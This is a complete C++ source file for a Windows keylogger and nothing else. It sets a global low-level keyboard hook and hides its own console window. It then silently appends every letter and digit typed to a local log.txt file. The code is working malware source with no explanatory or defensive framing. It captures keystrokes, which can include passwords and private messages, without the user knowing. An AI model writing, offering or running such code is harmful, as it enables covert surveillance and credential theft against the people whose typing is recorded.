#include <windows.h>
#include <fstream>

std::ofstream f;

LRESULT CALLBACK proc(int nCode, WPARAM wParam, LPARAM lParam)
{
    PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam;
    if (nCode == 0)
    {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
        {
            if ((key->vkCode >= 65 && key->vkCode <= 90) || (key->vkCode >= 48 && key->vkCode <= 57))
            {
                
                f.open("log.txt", std::ofstream::app);
                f << char(key->vkCode) << "\n";
                f.close();
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    HHOOK hHook = SetWindowsHookExA(13, proc, NULL, 0);
    if (hHook != NULL)
    {
        MSG msg = {};
        while (GetMessageA(&msg, NULL, 0, 0) > 0)
        {
            TranslateMessage(&msg);
            DispatchMessageA(&msg);
        }
    }
    return 0;
}
